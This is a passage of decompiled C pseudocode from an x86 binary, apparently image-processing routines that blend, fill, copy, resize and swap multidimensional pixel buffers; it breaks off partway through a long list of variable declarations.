    if ( v61 < 0 )
      v22 = v55;
    v55 = v20 - Size;
    v49 = v22;
    v50 = v52 - v17;
    v23 = 0;
    v51 = v22 - v61;
    if ( v59 < 0 )
      v23 = -v59;
    v56 = v23;
    if ( (int)(v13 + Size) <= v18 )
      v24 = 0;
    else
      v24 = Size + v13 - v18;
    v25 = this[1];
    Size = v13 - v24 - v55;
    if ( (int)(v58 + v60) <= v25 )
      v26 = 0;
    else
      v26 = v60 + v58 - v25;
    v27 = this[2];
    v58 = v58 - v26 - v50;
    if ( v57 + v61 <= v27 )
      v28 = 0;
    else
      v28 = v61 + v57 - v27;
    v29 = this[3];
    v57 = v57 - v28 - v51;
    if ( v54 + v59 <= v29 )
      v30 = 0;
    else
      v30 = v59 + v54 - v29;
    v31 = v54 - v30 - v56;
    v54 = v31;
    v33 = sub_41C8A0(v19).m128_u32[0];
    v34 = v53;
    v60 = v33;
    *(float *)&v35 = 1.0 - fmaxf(0.0, v19.m128_f32[0]);
    v47 = v35;
    if ( v36 > 0 && v58 > 0 && v57 > 0 && v31 > 0 )
    {
      do
      {
        v37 = 0;
        v61 = 0;
        do
        {
          v38 = 0;
          do
          {
            v39 = (char *)(this[5] + v48 + *this * (v52 + v38 + this[1] * (v49 + v37 + this[2] * (v32 + v59))));
            v40 = (char *)(v55 + v34[5] + *v34 * (v50 + v38 + v34[1] * (v51 + v37 + v56 * v34[2])));
            if ( v19.m128_f32[0] < 1.0 )
            {
              v41 = Size;
              do
              {
                v42 = *v40++;
                v43 = (float)((float)v42 * *(float *)&v33) + (float)((float)*v39 * *(float *)&v35);
                v33 = v60;
                *v39++ = (int)v43;
                --v41;
              }
              while ( v41 );
              v34 = v53;
            }
            else
            {
              memmove(v39, v40, Size);
              v35 = v47;
              v19.m128_f32[0] = a7;
            }
            v33 = v60;
            ++v38;
            v37 = v61;
            v32 = v56;
          }
          while ( v38 < v58 );
          v37 = v61 + 1;
          v61 = v37;
        }
        while ( v37 < v57 );
        v32 = v56 + 1;
        v8 = v54-- == 1;
        ++v56;
      }
      while ( !v8 );
    }
    return (int)this;
  }
  sub_4237A0(v44, (int)a6, *a6);
  v63 = 0;
  v15 = sub_4230E0(Size, v60, v61, v59, v44, LODWORD(a7));
  if ( !v45 )
    j_j__free(Block);
  return v15;
}
// 42337A: variable 'v36' is possibly undefined
// 4233AA: variable 'v32' is possibly undefined
// 4230E0: using guessed type _DWORD var_64[4];

//----- (00423490) --------------------------------------------------------
_DWORD *__fastcall sub_423490(_DWORD *a1, _DWORD *a2)
{
  if ( *a2 < *a1 )
    return a2;
  return a1;
}

//----- (004234A0) --------------------------------------------------------
const char *sub_4234A0()
{
  return "double";
}

//----- (004234B0) --------------------------------------------------------
_DWORD *__thiscall sub_4234B0(_DWORD *this, int *a2)
{
  int *v3; // edx
  int v4; // edi
  size_t v5; // ebx
  int *v6; // ecx
  unsigned int v7; // ebx
  unsigned int v8; // ebx
  int *v9; // edi

  v3 = (int *)this[5];
  if ( !v3 )
    return this;
  if ( !*this || !this[1] )
    return this;
  v4 = this[2];
  if ( !v4 || !this[3] )
    return this;
  v5 = 4 * v4 * this[3] * this[1] * *this;
  if ( !*a2 )
  {
    memset(v3, 0, v5);
    return this;
  }
  v6 = &v3[v5 / 4];
  v7 = v5 >> 2;
  if ( v3 > v6 )
    v7 = 0;
  if ( v7 >= 4 && (v3 > a2 || &v3[v7 - 1] < a2) )
  {
    v8 = 4 * (v7 & 0xFFFFFFFC);
    v9 = v3;
    v3 = (int *)((char *)v3 + v8);
    memset32(v9, *a2, v8 >> 2);
  }
  if ( v3 >= v6 )
    return this;
  do
    *v3++ = *a2;
  while ( v3 < v6 );
  return this;
}

//----- (004235A0) --------------------------------------------------------
void **__thiscall sub_4235A0(void **this, char *Src, int a3, int a4, int a5, int a6)
{
  int v7; // eax
  size_t v9; // edi
  int v10; // ecx
  void *v12; // [esp-Ch] [ebp-40h]
  _DWORD v13[13]; // [esp+0h] [ebp-34h] BYREF
  void *Srca; // [esp+3Ch] [ebp+8h]

  v13[9] = v13;
  v13[8] = this;
  v7 = a4;
  v9 = a6 * a5 * a4 * a3;
  if ( !Src || !v9 )
  {
    if ( !*((_BYTE *)this + 16) )
      j_j__free(this[5]);
    this[3] = 0;
    this[2] = 0;
    this[1] = 0;
    *this = 0;
    *((_BYTE *)this + 16) = 0;
    this[5] = 0;
    return this;
  }
  v10 = (_DWORD)this[1] * (_DWORD)*this * (_DWORD)this[3] * (_DWORD)this[2];
  if ( Src == this[5] && v9 == v10 )
    return (void **)sub_422060((int)this, a3, a4, a5, a6);
  if ( *((_BYTE *)this + 16) )
    goto LABEL_11;
  if ( &Src[v9] < this[5] || Src >= (char *)this[5] + v10 )
  {
    v7 = a4;
LABEL_11:
    sub_422060((int)this, a3, v7, a5, a6);
    v12 = this[5];
    if ( *((_BYTE *)this + 16) )
      memmove_0(v12, Src, v9);
    else
      memmove(v12, Src, v9);
    return this;
  }
  v13[12] = 0;
  Srca = (void *)unknown_libname_86(a6 * a5 * a4 * a3);
  memmove(Srca, Src, v9);
  j_j__free(this[5]);
  this[5] = Srca;
  *this = (void *)a3;
  this[1] = (void *)a4;
  this[2] = (void *)a5;
  this[3] = (void *)a6;
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (004237A0) --------------------------------------------------------
_DWORD *__thiscall sub_4237A0(_DWORD *this, int a2, int a3)
{
  size_t v4; // edi
  void *v5; // eax
  _DWORD v7[13]; // [esp+0h] [ebp-34h] BYREF

  v7[9] = v7;
  v7[8] = this;
  v4 = *(_DWORD *)(a2 + 12) * *(_DWORD *)(a2 + 8) * *(_DWORD *)a2 * *(_DWORD *)(a2 + 4);
  if ( *(_DWORD *)(a2 + 20) && v4 )
  {
    *this = *(_DWORD *)a2;
    this[1] = *(_DWORD *)(a2 + 4);
    this[2] = *(_DWORD *)(a2 + 8);
    this[3] = *(_DWORD *)(a2 + 12);
    *((_BYTE *)this + 16) = 0;
    v7[12] = 0;
    v5 = (void *)unknown_libname_86(v4);
    this[5] = v5;
    memmove(v5, *(const void **)(a2 + 20), v4);
  }
  else
  {
    this[3] = 0;
    this[2] = 0;
    this[1] = 0;
    *this = 0;
    *((_BYTE *)this + 16) = 0;
    this[5] = 0;
  }
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00423900) --------------------------------------------------------
_BYTE *__thiscall sub_423900(_BYTE *this, unsigned int a2, int a3, int a4, int a5)
{
  int v6; // eax
  _DWORD v8[13]; // [esp+0h] [ebp-34h] BYREF

  v8[9] = v8;
  v8[8] = this;
  this[16] = 0;
  if ( a2 )
  {
    *(_DWORD *)this = a2;
    *((_DWORD *)this + 1) = 1;
    *((_DWORD *)this + 2) = 1;
    *((_DWORD *)this + 3) = 1;
    v8[12] = 0;
    v6 = unknown_libname_86((unsigned __int64)a2 >> 29 != 0 ? -1 : 8 * a2);
  }
  else
  {
    *((_DWORD *)this + 3) = 0;
    v6 = 0;
    *((_DWORD *)this + 2) = 0;
    *((_DWORD *)this + 1) = 0;
    *(_DWORD *)this = 0;
  }
  *((_DWORD *)this + 5) = v6;
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00423A30) --------------------------------------------------------
int __thiscall sub_423A30(_DWORD *this, int a2, int a3, int a4, int a5)
{
  return this[5] + 4 * (a2 + *this * (a3 + this[1] * (a4 + a5 * this[2])));
}

//----- (00423A60) --------------------------------------------------------
_BYTE *__thiscall sub_423A60(_BYTE *this, int a2, int a3, int a4, int a5, float *a6)
{
  int v7; // eax
  float *v8; // esi
  int v9; // edi
  int v10; // eax
  int v11; // xmm0_4
  size_t v12; // ecx
  char *v13; // edi
  unsigned int v14; // eax
  float *v15; // edi
  _DWORD v17[13]; // [esp+0h] [ebp-34h] BYREF
  unsigned int v18; // [esp+40h] [ebp+Ch]
  float *v19; // [esp+44h] [ebp+10h]

  v17[9] = v17;
  v17[8] = this;
  this[16] = 0;
  v7 = a5 * a4 * a3 * a2;
  if ( v7 )
  {
    *(_DWORD *)this = a2;
    *((_DWORD *)this + 1) = a3;
    *((_DWORD *)this + 2) = a4;
    *((_DWORD *)this + 3) = a5;
    v17[12] = 0;
    v8 = (float *)unknown_libname_86((unsigned __int64)(unsigned int)v7 >> 30 != 0 ? -1 : 4 * v7);
    *((_DWORD *)this + 5) = v8;
    if ( v8 )
    {
      if ( *(_DWORD *)this )
      {
        if ( *((_DWORD *)this + 1) )
        {
          v9 = *((_DWORD *)this + 2);
          if ( v9 )
          {
            v10 = *((_DWORD *)this + 3);
            if ( v10 )
            {
              v11 = *(int *)a6;
              v12 = v10 * v9 * *((_DWORD *)this + 1) * *(_DWORD *)this;
              if ( *a6 == 0.0 )
              {
                memset(v8, (unsigned int)*(float *)&v11, v12 * 4);
              }
              else
              {
                v13 = (char *)&v8[v12];
                v19 = &v8[v12];
                v14 = (v12 * 4 + 3) >> 2;
                if ( v8 > &v8[v12] )
                  v14 = 0;
                if ( v14 >= 4 && (v8 > a6 || &v8[v14 - 1] < a6) )
                {
                  v15 = v8;
                  v18 = 4 * (v14 & 0xFFFFFFFC);
                  v8 = (float *)((char *)v8 + v18);
                  memset32(v15, v11, v18 >> 2);
                  v13 = (char *)v19;
                }
                if ( v8 < (float *)v13 )
                {
                  if ( ((v13 - (char *)v8 + 3) & 0xFFFFFFFC) < 0x10 )
                    goto LABEL_25;
                  do
                  {
                    *v8 = *a6;
                    v8[1] = *a6;
                    v8[2] = *a6;
                    v8[3] = *a6;
                    v8 += 4;
                  }
                  while ( v8 < (float *)v13 - 3 );
                  if ( v8 < (float *)v13 )
                  {
LABEL_25:
                    do
                      *v8++ = *a6;
                    while ( v8 < (float *)v13 );
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  else
  {
    *((_DWORD *)this + 3) = 0;
    *((_DWORD *)this + 2) = 0;
    *((_DWORD *)this + 1) = 0;
    *(_DWORD *)this = 0;
    *((_DWORD *)this + 5) = 0;
  }
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00423CB0) --------------------------------------------------------
void __thiscall sub_423CB0(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
}

//----- (00423CD0) --------------------------------------------------------
int __thiscall sub_423CD0(int this, int a2, int a3, int a4, int a5, int a6, int a7, __int64 a8, float a9, float a10)
{
  int v10; // esi
  int v11; // ebx
  int v12; // edi
  int v13; // eax
  int v14; // edx
  int v15; // ecx
  int v16; // ebx
  int v17; // edi
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  _BYTE *v21; // eax
  _DWORD *v22; // eax
  void *v23; // ecx
  char v25[20]; // [esp+20h] [ebp-24h] BYREF
  void *Block; // [esp+34h] [ebp-10h]
  int v27; // [esp+40h] [ebp-4h]
  int v28; // [esp+58h] [ebp+14h]

  v10 = this;
  v11 = a2;
  if ( a2 && (v12 = a3) != 0 && a5 )
  {
    if ( a2 < 0 )
      v11 = a2 * *(_DWORD *)this / -100;
    if ( a3 < 0 )
      v12 = a3 * *(_DWORD *)(this + 4) / -100;
    if ( a4 < 0 )
      a4 = a4 * *(_DWORD *)(this + 8) / -100;
    v13 = a5;
    if ( a5 < 0 )
      v13 = a5 * *(_DWORD *)(this + 12) / -100;
    v14 = 1;
    v15 = 1;
    if ( v11 )
      v15 = v11;
    v28 = v15;
    v16 = 1;
    if ( v12 )
      v16 = v12;
    v17 = 1;
    if ( a4 )
      v17 = a4;
    v18 = *(_DWORD *)v10;
    if ( v13 )
      v14 = v13;
    v19 = v28;
    if ( v28 != v18 || v16 != *(_DWORD *)(v10 + 4) || v17 != *(_DWORD *)(v10 + 8) || v14 != *(_DWORD *)(v10 + 12) )
    {
      if ( *(_DWORD *)(v10 + 20) && v18 && *(_DWORD *)(v10 + 4) && *(_DWORD *)(v10 + 8) && *(_DWORD *)(v10 + 12) )
      {
        v20 = a6;
        if ( a6 == -1 )
        {
          v19 = v28;
          if ( v28 * v16 * v17 * v14 == *(_DWORD *)(v10 + 8)
                                      * *(_DWORD *)v10
                                      * *(_DWORD *)(v10 + 4)
                                      * *(_DWORD *)(v10 + 12) )
          {
            *(_DWORD *)v10 = v28;
            *(_DWORD *)(v10 + 4) = v16;
            *(_DWORD *)(v10 + 8) = v17;
            *(_DWORD *)(v10 + 12) = v14;
            return v10;
          }
          v20 = -1;
        }
        v21 = sub_424050(
                (int *)v10,
                (unsigned int)v25,
                v19,
                v16,
                v17,
                v14,
                v20,
                a7,
                *(float *)&a8,
                *((float *)&a8 + 1),
                a9,
                a10);
        v27 = 0;
        v10 = sub_423F60((int)v21, v10);
        if ( !v25[16] )
          j_j__free(Block);
      }
      else
      {
        v22 = (_DWORD *)sub_42A620(v10, v28, v16, v17, v14);
        v10 = (int)v22;
        v23 = (void *)v22[5];
        if ( v23 && *v22 && v22[1] && v22[2] && v22[3] )
          memset(v23, 0, *v22 * v22[1] * v22[2] * v22[3]);
      }
    }
  }
  else
  {
    if ( !*(_BYTE *)(this + 16) )
      j_j__free(*(void **)(this + 20));
    *(_DWORD *)(v10 + 12) = 0;
    *(_DWORD *)(v10 + 8) = 0;
    *(_DWORD *)(v10 + 4) = 0;
    *(_DWORD *)v10 = 0;
    *(_BYTE *)(v10 + 16) = 0;
    *(_DWORD *)(v10 + 20) = 0;
  }
  return v10;
}

//----- (00423F40) --------------------------------------------------------
_DWORD *__thiscall sub_423F40(void *this, _DWORD *a2)
{
  sub_42A7F0(a2, (int)this, (int)this);
  return a2;
}

//----- (00423F60) --------------------------------------------------------
int __thiscall sub_423F60(int this, int a2)
{
  int v3; // ecx
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  int result; // eax

  if ( *(_BYTE *)(this + 16) || *(_BYTE *)(a2 + 16) )
  {
    sub_42B4F0(
      (void **)a2,
      *(char **)(this + 20),
      *(_DWORD *)this,
      *(_DWORD *)(this + 4),
      *(_DWORD *)(this + 8),
      *(_DWORD *)(this + 12));
  }
  else
  {
    v3 = *(_DWORD *)this;
    *(_DWORD *)this = *(_DWORD *)a2;
    v4 = *(_DWORD *)(a2 + 4);
    *(_DWORD *)a2 = v3;
    v5 = *(_DWORD *)(this + 4);
    *(_DWORD *)(this + 4) = v4;
    v6 = *(_DWORD *)(a2 + 8);
    *(_DWORD *)(a2 + 4) = v5;
    v7 = *(_DWORD *)(this + 8);
    *(_DWORD *)(this + 8) = v6;
    v8 = *(_DWORD *)(a2 + 12);
    *(_DWORD *)(a2 + 8) = v7;
    v9 = *(_DWORD *)(this + 12);
    *(_DWORD *)(this + 12) = v8;
    v10 = *(_DWORD *)(a2 + 20);
    *(_DWORD *)(a2 + 12) = v9;
    v11 = *(_DWORD *)(this + 20);
    *(_DWORD *)(this + 20) = v10;
    LOBYTE(v10) = *(_BYTE *)(a2 + 16);
    *(_DWORD *)(a2 + 20) = v11;
    LOBYTE(v11) = *(_BYTE *)(this + 16);
    *(_BYTE *)(this + 16) = v10;
    *(_BYTE *)(a2 + 16) = v11;
  }
  if ( !*(_BYTE *)(this + 16) )
    j_j__free(*(void **)(this + 20));
  result = a2;
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)this = 0;
  *(_BYTE *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  return result;
}

//----- (00424010) --------------------------------------------------------
void **__thiscall sub_424010(void **this)
{
  void **result; // eax

  if ( !*((_BYTE *)this + 16) )
    j_j__free(this[5]);
  this[3] = 0;
  result = this;
  this[2] = 0;
  this[1] = 0;
  *this = 0;
  *((_BYTE *)this + 16) = 0;
  this[5] = 0;
  return result;
}

//----- (00424050) --------------------------------------------------------
_BYTE *__thiscall sub_424050(
        int *this,
        unsigned int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        float a9,
        float a10,
        float a11,
        float a12)
{
  int *v12; // ebx
  unsigned int v13; // esi
  int v14; // ecx
  int v15; // eax
  size_t v16; // edi
  unsigned int v17; // edx
  int v18; // esi
  int v19; // ecx
  unsigned int v20; // edx
  int v21; // edx
  int v23; // edx
  int v24; // ecx
  size_t v25; // edx
  unsigned int v26; // esi
  int *v27; // eax
  int *v28; // eax
  signed int *v29; // eax
  int v30; // edi
  int v31; // esi
  int v32; // edi
  int v33; // eax
  int v34; // eax
  int v35; // ecx
  int v36; // edx
  int v37; // edx
  int v38; // eax
  int v39; // eax
  int v40; // edx
  int v41; // edi
  signed int v42; // ecx
  int v43; // esi
  signed int v44; // ecx
  int v45; // edx
  int v46; // ebx
  int v47; // edx
  char v48; // al
  int v49; // edx
  int v50; // edx
  int v51; // ecx
  int v52; // edi
  size_t v53; // edx
  int v54; // ecx
  int v55; // edx
  signed int v56; // eax
  signed int v57; // esi
  int v58; // ecx
  int v59; // esi
  signed int v60; // esi
  signed int *v61; // eax
  int v62; // edi
  int v63; // esi
  _DWORD *v64; // eax
  signed int v65; // esi
  signed int v66; // edx
  _DWORD *v67; // eax
  signed int v68; // esi
  _DWORD *v69; // eax
  int v70; // esi
  signed int v71; // esi
  _DWORD *v72; // eax
  int v73; // esi
  int v74; // esi
  _DWORD *v75; // eax
  int i; // esi
  signed int v77; // esi
  unsigned int j; // eax
  _DWORD *v79; // eax
  int v80; // esi
  _DWORD *v81; // eax
  int k; // esi
  int v83; // eax
  int v84; // eax
  int v85; // edi
  int v86; // ebx
  int v87; // esi
  int v88; // eax
  _DWORD *v89; // eax
  int v90; // eax
  int m; // esi
  int v92; // edx
  unsigned int v93; // ecx
  size_t v94; // edx
  int v95; // edi
  size_t v96; // esi
  size_t v97; // eax
  _DWORD *v98; // eax
  unsigned int v99; // edx
  int v100; // edi
  unsigned int v101; // esi
  size_t v102; // eax
  unsigned int v103; // ecx
  _DWORD *v104; // eax
  unsigned int v105; // edx
  int v106; // edi
  unsigned int v107; // esi
  size_t v108; // eax
  unsigned int v109; // ecx
  _DWORD *v110; // eax
  unsigned int v111; // edx
  int v112; // edi
  unsigned int v113; // esi
  size_t v114; // eax
  size_t v115; // edx
  unsigned int v116; // ebx
  unsigned int *v117; // edi
  _BYTE *v118; // esi
  size_t v119; // ecx
  int v120; // eax
  unsigned int *v121; // edx
  unsigned int *v122; // ebx
  unsigned int v123; // edi
  _BYTE *v124; // edx
  int v125; // ebx
  size_t v126; // ecx
  unsigned int v127; // eax
  unsigned int v128; // eax
  unsigned int v129; // ebx
  size_t v130; // ecx
  char *v131; // edi
  unsigned int v132; // eax
  size_t v133; // ecx
  char *v134; // edi
  int v135; // esi
  size_t v136; // edi
  unsigned int *v137; // eax
  int v138; // ecx
  int v139; // ebx
  unsigned int v140; // edx
  size_t v141; // edi
  int v142; // eax
  int v143; // edi
  int n; // edi
  int v145; // esi
  float *v146; // eax
  int v147; // ebx
  int v148; // edx
  int v149; // edi
  int v150; // esi
  float *v151; // eax
  int v152; // eax
  int v153; // ecx
  int v154; // ebx
  unsigned int v155; // esi
  size_t *v156; // eax
  int v157; // edx
  size_t v158; // eax
  int v159; // esi
  int v160; // ecx
  int v161; // eax
  int v162; // edi
  int v163; // esi
  float *v164; // eax
  int v165; // edi
  int v166; // esi
  float *v167; // eax
  int v168; // edx
  int v169; // edi
  int v170; // esi
  float *v171; // eax
  int v172; // ecx
  int v173; // ebx
  unsigned int v174; // esi
  size_t *v175; // eax
  int v176; // edx
  size_t v177; // eax
  int v178; // esi
  int v179; // ecx
  int v180; // eax
  int v181; // edi
  int v182; // esi
  float *v183; // eax
  int v184; // edi
  int v185; // esi
  float *v186; // eax
  int v187; // edx
  int v188; // edi
  int v189; // esi
  float *v190; // eax
  int v191; // ecx
  int v192; // ebx
  unsigned int v193; // esi
  size_t *v194; // eax
  int v195; // edx
  size_t v196; // eax
  int v197; // esi
  int v198; // ecx
  int v199; // eax
  int v200; // edi
  int v201; // esi
  float *v202; // eax
  int v203; // edi
  int v204; // esi
  float *v205; // eax
  int v206; // edx
  int v207; // edi
  int v208; // esi
  float *v209; // eax
  unsigned int v210; // eax
  int v211; // edi
  unsigned int v212; // eax
  int v213; // eax
  double v214; // xmm1_8
  size_t v215; // eax
  __m128i v216; // xmm0
  double v217; // xmm1_8
  double v218; // xmm2_8
  _DWORD *v219; // edi
  double *v220; // ecx
  unsigned int v221; // eax
  unsigned int v222; // esi
  bool v223; // cc
  int v224; // edi
  int v225; // edx
  int v226; // esi
  int v227; // eax
  int v228; // ecx
  int v229; // edi
  unsigned __int8 *v230; // esi
  _BYTE *v231; // edi
  int *v232; // ebx
  double *v233; // ecx
  double v234; // xmm2_8
  unsigned __int8 v235; // dl
  double v236; // xmm0_8
  int v237; // eax
  int v238; // edx
  int v239; // eax
  unsigned int v240; // eax
  int v241; // eax
  double v242; // xmm1_8
  unsigned int v243; // eax
  __m128i v244; // xmm0
  double v245; // xmm1_8
  double v246; // xmm2_8
  _DWORD *v247; // edi
  double *v248; // ecx
  unsigned int v249; // eax
  unsigned int v250; // esi
  int v251; // edi
  int v252; // edx
  int v253; // esi
  int v254; // eax
  int v255; // ecx
  int v256; // edi
  unsigned __int8 *v257; // esi
  _BYTE *v258; // edi
  int *v259; // ebx
  double *v260; // ecx
  size_t v261; // edx
  unsigned __int8 v262; // dl
  int v263; // eax
  unsigned int v264; // eax
  int v265; // eax
  double v266; // xmm1_8
  unsigned int v267; // eax
  __m128i v268; // xmm0
  double v269; // xmm1_8
  unsigned int *v270; // edi
  size_t v271; // ebx
  double v272; // xmm2_8
  double *v273; // ecx
  unsigned int v274; // eax
  unsigned int v275; // esi
  size_t v276; // edx
  int v277; // esi
  int v278; // ecx
  int v279; // eax
  int v280; // edx
  int v281; // eax
  unsigned __int8 *v282; // esi
  _BYTE *v283; // edi
  int *v284; // ebx
  double *v285; // ecx
  double v286; // xmm2_8
  unsigned __int8 v287; // dl
  double v288; // xmm0_8
  int v289; // eax
  signed int v290; // edx
  int v291; // eax
  unsigned int v292; // eax
  int v293; // eax
  double v294; // xmm1_8
  unsigned int v295; // eax
  __m128i v296; // xmm0
  double v297; // xmm1_8
  size_t v298; // ebx
  double *v299; // ecx
  unsigned int *v300; // edi
  unsigned int v301; // eax
  unsigned int v302; // esi
  double v303; // xmm0_8
  size_t v304; // edx
  int v305; // esi
  int v306; // ecx
  int v307; // eax
  int v308; // edx
  int v309; // eax
  unsigned __int8 *v310; // esi
  _BYTE *v311; // edi
  int *v312; // ebx
  double *v313; // ecx
  double v314; // xmm2_8
  unsigned __int8 v315; // dl
  double v316; // xmm0_8
  int v317; // eax
  signed int v318; // edx
  int v319; // eax
  _DWORD *v320; // eax
  int v321; // ebx
  _DWORD *v322; // eax
  int v323; // ebx
  _DWORD *v324; // eax
  int v325; // ebx
  _DWORD *v326; // eax
  int v327; // ebx
  _BYTE *v328; // edi
  __int16 v329; // bx
  void **v330; // ecx
  int v331; // eax
  unsigned int v332; // eax
  int v333; // edx
  float v334; // xmm1_4
  int v335; // esi
  int v336; // eax
  int v337; // edi
  int v338; // ecx
  int v339; // ecx
  int v340; // edx
  int v341; // esi
  int v342; // edi
  int v343; // esi
  char v344; // bl
  _BYTE *v345; // eax
  int v346; // eax
  int v347; // esi
  unsigned int v348; // eax
  int v349; // edx
  float v350; // xmm1_4
  __m128i v351; // xmm0
  int v352; // esi
  int v353; // ebx
  int v354; // edi
  int v355; // ecx
  int v356; // eax
  int v357; // ecx
  int v358; // edx
  int v359; // edi
  int v360; // esi
  char v361; // bl
  _BYTE *v362; // eax
  int v363; // eax
  int v364; // esi
  unsigned int v365; // eax
  int v366; // edx
  float v367; // xmm1_4
  __m128i v368; // xmm0
  int v369; // esi
  int v370; // ebx
  int v371; // edi
  int v372; // ecx
  int v373; // eax
  int v374; // ecx
  int v375; // edx
  int v376; // edi
  int v377; // esi
  char v378; // bl
  _BYTE *v379; // eax
  int v380; // eax
  int v381; // esi
  unsigned int v382; // eax
  int v383; // edx
  float v384; // xmm1_4
  __m128i v385; // xmm0
  int v386; // esi
  int v387; // ebx
  int v388; // edi
  int v389; // ecx
  int v390; // eax
  int v391; // ecx
  int v392; // edx
  int v393; // edi
  int v394; // esi
  char v395; // bl
  _BYTE *v396; // eax
  _DWORD *v397; // eax
  int v398; // esi
  _DWORD *v399; // eax
  int v400; // esi
  _DWORD *v401; // eax
  int v402; // esi
  _DWORD *v403; // eax
  int v404; // esi
  _BYTE *v405; // edi
  int v406; // esi
  unsigned int v407; // eax
  int v408; // edi
  unsigned int v409; // eax
  int v410; // eax
  double v411; // xmm1_8
  size_t v412; // eax
  __m128i v413; // xmm0
  double v414; // xmm1_8
  double v415; // xmm2_8
  _DWORD *v416; // edi
  double *v417; // ecx
  unsigned int v418; // eax
  unsigned int v419; // esi
  int v420; // edx
  int v421; // edi
  int v422; // ecx
  int v423; // eax
  int v424; // esi
  int v425; // edi
  int v426; // eax
  int v427; // ecx
  unsigned __int8 *v428; // esi
  int v429; // eax
  int *v430; // edx
  int v431; // edi
  _BYTE *v432; // ecx
  double *v433; // ebx
  double v434; // xmm5_8
  double v435; // xmm6_8
  double v436; // xmm3_8
  double v437; // xmm7_8
  double v438; // xmm0_8
  double v439; // xmm2_8
  int v440; // eax
  unsigned int v441; // eax
  int v442; // eax
  double v443; // xmm1_8
  unsigned int v444; // eax
  __m128i v445; // xmm0
  double v446; // xmm1_8
  double v447; // xmm2_8
  _DWORD *v448; // edi
  double *v449; // ecx
  unsigned int v450; // eax
  unsigned int v451; // esi
  int v452; // ecx
  int v453; // edi
  int v454; // edx
  int v455; // eax
  int v456; // esi
  int v457; // ecx
  int v458; // eax
  int v459; // edi
  unsigned __int8 *v460; // esi
  size_t v461; // edi
  _BYTE *v462; // edx
  int *v463; // ebx
  double *v464; // eax
  size_t v465; // ecx
  double v466; // xmm5_8
  double v467; // xmm6_8
  double v468; // xmm3_8
  double v469; // xmm7_8
  double v470; // xmm0_8
  double v471; // xmm2_8
  int v472; // eax
  unsigned int v473; // eax
  int v474; // eax
  double v475; // xmm1_8
  unsigned int v476; // eax
  __m128i v477; // xmm0
  double v478; // xmm1_8
  size_t v479; // edi
  double v480; // xmm2_8
  double *v481; // ecx
  unsigned int v482; // eax
  unsigned int v483; // esi
  size_t v484; // edx
  int v485; // ecx
  int v486; // edx
  int v487; // eax
  int v488; // esi
  int v489; // ecx
  int v490; // eax
  int v491; // ebx
  unsigned __int8 *v492; // esi
  size_t v493; // ebx
  _BYTE *v494; // ecx
  _DWORD *v495; // edx
  double *v496; // eax
  double v497; // xmm5_8
  double v498; // xmm6_8
  double v499; // xmm3_8
  double v500; // xmm7_8
  double v501; // xmm0_8
  double v502; // xmm2_8
  unsigned int v503; // eax
  int v504; // eax
  double v505; // xmm1_8
  unsigned int v506; // eax
  __m128i v507; // xmm0
  double v508; // xmm1_8
  size_t v509; // edi
  double v510; // xmm2_8
  double *v511; // ecx
  unsigned int v512; // eax
  unsigned int v513; // esi
  size_t v514; // edx
  int v515; // ecx
  int v516; // edx
  int v517; // eax
  int v518; // esi
  int v519; // ecx
  int v520; // eax
  int v521; // ebx
  unsigned __int8 *v522; // esi
  size_t v523; // ebx
  _BYTE *v524; // ecx
  _DWORD *v525; // edx
  double *v526; // eax
  double v527; // xmm4_8
  double v528; // xmm6_8
  double v529; // xmm3_8
  double v530; // xmm7_8
  double v531; // xmm0_8
  double v532; // xmm2_8
  _DWORD *v533; // eax
  int v534; // esi
  _DWORD *v535; // eax
  int v536; // esi
  _DWORD *v537; // eax
  int v538; // esi
  _DWORD *v539; // eax
  int v540; // esi
  int v541; // esi
  bool v542; // zf
  unsigned int v543; // eax
  int v544; // edi
  unsigned int v545; // eax
  int v546; // eax
  double v547; // xmm1_8
  size_t v548; // eax
  __m128i v549; // xmm0
  double v550; // xmm1_8
  double v551; // xmm2_8
  _DWORD *v552; // edi
  double *v553; // ecx
  unsigned int v554; // eax
  unsigned int v555; // esi
  int v556; // edx
  int v557; // edi
  int v558; // ecx
  int v559; // eax
  int v560; // esi
  int v561; // edi
  unsigned __int8 *v562; // esi
  _BYTE *v563; // edi
  _DWORD *v564; // ebx
  double *v565; // eax
  double v566; // xmm6_8
  double v567; // xmm0_8
  double v568; // xmm2_8
  double v569; // xmm1_8
  double v570; // xmm3_8
  double v571; // xmm0_8
  double v572; // xmm1_8
  double v573; // xmm0_8
  unsigned int v574; // eax
  int v575; // eax
  double v576; // xmm1_8
  unsigned int v577; // eax
  __m128i v578; // xmm0
  double v579; // xmm1_8
  double v580; // xmm2_8
  _DWORD *v581; // edi
  double *v582; // ecx
  unsigned int v583; // eax
  unsigned int v584; // esi
  int v585; // edx
  int v586; // edi
  int v587; // ecx
  int v588; // eax
  int v589; // esi
  int v590; // edx
  unsigned __int8 *v591; // esi
  int v592; // edi
  unsigned __int8 *v593; // edi
  _BYTE *v594; // ebx
  double *v595; // eax
  double v596; // xmm7_8
  double v597; // xmm3_8
  double v598; // xmm0_8
  double v599; // xmm2_8
  double v600; // xmm4_8
  double v601; // xmm1_8
  double v602; // xmm0_8
  double v603; // xmm1_8
  _DWORD *v604; // ecx
  unsigned int v605; // eax
  int v606; // eax
  double v607; // xmm1_8
  unsigned int v608; // eax
  __m128i v609; // xmm0
  double v610; // xmm1_8
  size_t v611; // edi
  double v612; // xmm2_8
  double *v613; // ecx
  unsigned int v614; // eax
  unsigned int v615; // esi
  size_t v616; // edx
  int v617; // edx
  int v618; // ecx
  int v619; // eax
  int v620; // esi
  int v621; // edx
  int v622; // eax
  int v623; // ebx
  unsigned __int8 *v624; // esi
  size_t v625; // ebx
  double *v626; // eax
